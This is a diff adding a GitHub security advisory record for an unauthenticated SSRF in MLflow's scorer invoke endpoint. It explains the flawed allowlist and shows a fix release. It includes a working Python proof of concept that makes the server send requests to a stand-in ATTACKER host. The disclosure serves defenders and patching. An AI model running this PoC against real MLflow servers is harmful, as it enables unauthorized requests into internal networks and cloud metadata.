@@ -1,0 +1,69 @@
+{
+  "id": "GHSA-2wqp-q3c6-ccj5",
+  "modified": "2026-10-23T22:15:03.547385314Z",
+  "published": "2026-10-23T22:07:26Z",
+  "aliases": [
+    "CVE-2026-115886"
+  ],
+  "summary": "MLflow: SSRF on unauthenticated MLflow servers via third-party scorer kwargs in the scorer invoke, register, and GenAI evaluate endpoints",
+  "details": "### Summary\nMLflow's tracking server exposes `POST /ajax-api/3.0/mlflow/scorer/invoke` with **no authentication**, and the handler reflectively instantiates an attacker-named class from attacker-supplied JSON with unconstrained constructor kwargs. With the optional `trulens` + `trulens-providers-litellm` packages installed, an unauthenticated attacker can force the server to make an outbound HTTP request to an arbitrary host of their choosing, carrying attacker-controlled headers (SSRF).\n\n### Details\n`Scorer.model_validate_json()` reflects a class name from a JSON payload behind an import-path allowlist that never constrains the reflected attribute or its kwargs, in `mlflow/genai/scorers/base.py:549-604`:\n\n```python\ndata = serialized.third_party_scorer_data          # attacker JSON\nmodule_path = data.get(\"module\") or \"\"\nclass_name = data.get(\"class\")\nif not any(module_path == m or module_path.startswith(m + \".\")\n           for m in THIRD_PARTY_SCORER_ALLOWED_MODULES):\n    raise MlflowException.invalid_parameter_value(...)\nmodule = importlib.import_module(module_path)\nscorer_class = getattr(module, class_name, None)   # attribute NOT constrained\n...\ninit_kwargs: dict[str, Any] = dict(data.get(\"kwargs\") or {})  # kwargs NOT constrained\n...\ninit_kwargs[\"model\"] = data[\"model\"]               # attacker model URI\nscorer_instance = scorer_class(**init_kwargs)      # reflective instantiation\n```\n\nThe allowlist (`mlflow/genai/scorers/scorer_utils.py:46-51`) only gates the import path:\n\n```python\nTHIRD_PARTY_SCORER_ALLOWED_MODULES = frozenset({\n    \"mlflow.genai.scorers.ragas\",\n    \"mlflow.genai.scorers.deepeval\",\n    \"mlflow.genai.scorers.trulens\",\n    \"mlflow.genai.scorers.phoenix\",\n})\n```\n\nFor a `mlflow.genai.scorers.trulens` class, the forwarded `model`/`kwargs` reach an outbound LLM client through a routing choice the attacker controls (`mlflow/genai/scorers/trulens/models.py:97-121`):\n\n```python\nbackend = ScorerLLMClient(model_uri)\nif backend.route == \"databricks\":\n    return _create_databricks_provider(backend, **kwargs)\nif backend.is_native:\n    return _create_gateway_provider(backend, **kwargs)\ntry:\n    from trulens.providers.litellm import LiteLLM\n    litellm_model = backend.model_name\n    ...\n    return LiteLLM(model_engine=litellm_model, **kwargs)   # raw attacker kwargs forwarded\n```\n\nOnly the `litellm` fallback branch reaches raw `**kwargs`; a `model` URI outside MLflow's native provider registry (e.g. `openai:/gpt-4o`) trivially routes there, and `LiteLLM.__init__` forwards `api_base`/`api_key` straight into `litellm.completion()`.\n\n- Route: `POST /ajax-api/3.0/mlflow/scorer/invoke` → `_invoke_scorer_handler` (`mlflow/server/handlers.py:7026-7098`), guarded only by `@catch_mlflow_exception`/`@_disable_if_artifacts_only` — no auth decorator.\n- `Scorer.model_validate_json(serialized_scorer)` (the vulnerable deserialization) runs synchronously, before any tracking-store lookup or `submit_job` call.\n- Precondition: the server venv must have `trulens` + `trulens-providers-litellm` installed (a documented but optional, not-bundled GenAI-eval setup).\n\n### PoC\n```python\nimport time\nimport mlflow\nfrom mlflow import MlflowClient\nimport requests\n\nTARGET = \"http://TARGET:5000\"           # MLflow tracking server, no auth configured\nATTACKER = \"http://ATTACKER/collect\"    # host the attacker controls and monitors\n\nclient = MlflowClient(tracking_uri=TARGET)\n\n# 1. Anonymous setup: create an experiment and log a trace to obtain a trace_id.\nexp_id = client.create_experiment(\"poc\")\nmlflow.set_tracking_uri(TARGET)\nmlflow.set_experiment(experiment_id=exp_id)\nwith mlflow.start_span(name=\"poc-span\") as span:\n    span.set_inputs({\"q\": \"hi\"})\n    span.set_outputs({\"a\": \"hi\"})\ntrace_id = span.request_id\n\n# 2. Attack: invoke a reflected trulens scorer whose kwargs point the\n#    outbound LLM client at the attacker host with an attacker-chosen\n#    Authorization value (their own canary, not a server secret).\nserialized_scorer = {\n    \"name\": \"poc\",\n    \"third_party_scorer_data\": {\n        \"module\": \"mlflow.genai.scorers.trulens\",\n        \"class\": \"Coherence\",\n        \"metric_name\": \"Coherence\",\n        \"model\": \"openai:/gpt-4o\",          # routes to the litellm fallback\n        \"kwargs\": {\n            \"api_base\": ATTACKER,\n            \"api_key\": \"ATTACKER-CANARY\",   # attacker's own value, not a server secret\n        },\n    },\n}\nresp = requests.post(\n    f\"{TARGET}/ajax-api/3.0/mlflow/scorer/invoke\",\n    json={\n        \"experiment_id\": exp_id,\n        \"serialized_scorer\": __import__(\"json\").dumps(serialized_scorer),\n        \"trace_ids\": [trace_id],\n    },\n)\nprint(resp.status_code, resp.text)\ntime.sleep(5)  # scorer job runs asynchronously\n```\n\n```\n# Attacker-controlled listener at ATTACKER receives, moments later:\nPOST /collect/chat/completions HTTP/1.1\nAuthorization: Bearer ATTACKER-CANARY\nContent-Type: application/json\n...\n```\n\nThe `POST .../chat/completions` request landing on `ATTACKER`, carrying the attacker's own `Authorization` header, is the server-originated outbound request — no request was ever sent by the client to that host directly.\n\n### Impact\nAn unauthenticated attacker forces the tracking server to issue an outbound HTTP request to an arbitrary attacker-chosen host — reachable from the server's network position, including internal services or cloud-metadata endpoints — with fully attacker-controlled request headers and body. This is SSRF with header/credential injection into the server-originated request; it requires no prior authentication and no operator misconfiguration beyond having the optional `trulens` + `trulens-providers-litellm` packages installed alongside MLflow.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "mlflow",
+        "purl": "pkg:pypi/mlflow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.12.0rc0"
+            },
+            {
+              "fixed": "3.17.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.12.0",
+        "3.12.0rc0",
+        "3.13.0",
+        "3.13.0rc0",
+        "3.14.0",
+        "3.15.0",
+        "3.15.1",
+        "3.15.2",
+        "3.16.0",
+        "3.16.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-2wqp-q3c6-ccj5/GHSA-2wqp-q3c6-ccj5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/mlflow/mlflow/security/advisories/GHSA-2wqp-q3c6-ccj5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/mlflow/mlflow/pull/25890"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/mlflow/mlflow/commit/bac30b4148c4f40045b4d4db07ae60ab3838803f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/mlflow/mlflow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/mlflow/mlflow/releases/tag/v3.17.0"
+    }
+  ]
+}
